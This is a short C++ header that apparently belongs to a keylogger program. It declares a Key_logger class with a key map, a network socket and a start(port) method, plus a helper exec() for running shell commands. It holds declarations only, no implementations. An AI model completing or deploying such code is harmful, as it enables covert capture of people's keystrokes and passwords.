#pragma once

#include <map>
std::string CurrentDateTime();
int check_path(int result);
bool isLetter(const int value);
inline std::string exec(const char* cmd);
class Key_logger{
private:
    std::map<unsigned short, std::string> keys;
    int _socket;
public:
    Key_logger();
    void start(int port);
    void get_keys_vector();

};